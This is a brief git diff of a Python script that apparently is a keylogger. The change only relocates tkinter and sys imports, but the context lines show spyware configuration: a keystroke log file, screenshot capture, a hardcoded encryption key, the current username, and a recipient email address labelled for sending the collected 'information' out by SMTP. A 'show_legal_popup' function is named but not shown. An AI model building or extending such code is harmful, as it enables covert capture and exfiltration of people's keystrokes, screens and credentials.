@@ -26,10 +26,7 @@ import smtplib, ssl
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-import tkinter as tk
-from tkinter import scrolledtext
-from tkinter import messagebox
-import sys
+
 
 keys_information = "key_log.txt"
 screenshot_information = 'screenshot.png'
@@ -43,6 +40,11 @@ key = 't-q7kCwsld-Wyj3b4vnK3p9yEWCKdoVJpnzoB-MA0oI='
 username = getpass.getuser()
 
 toaddr = "kodiugos@gmail.com"  # Enter the email address you want to send your information to
+
+import tkinter as tk
+from tkinter import scrolledtext
+from tkinter import messagebox
+import sys
 
 def show_legal_popup():
     # Create main window
